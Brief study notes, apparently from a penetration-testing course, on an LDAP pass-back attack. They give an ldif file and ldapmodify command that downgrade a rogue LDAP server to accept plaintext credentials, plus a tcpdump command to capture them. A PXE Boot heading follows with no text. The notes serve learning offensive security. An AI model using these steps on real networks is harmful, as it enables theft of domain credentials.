**LDAP Bind Credentials**

- LDAP Authentication follows the following steps:
![[Pasted image 20240519133410.png]]


**Pass-Back Attack**

- Here we basically change the IP of the LDAP server to a rogue LDAP server controlled by us
- Note that by default the LDAP will use the most secure method to send over the encrypted credentials and we don't want that since we want to read the plaintext credentials

- We create the following `ldif` file:
```
#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
```
**Note**: We have set the min protection to 0 which means no protection
- Now we apply the diff to the ldap config with the following command:
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

- To do a tcpdump of on an interface over a certain port:
```
sudo tcpdump -SX -i {interface-name} tcp port {port-number}
```


### PXE Boot

![[Pasted image 20240523230124.png]]


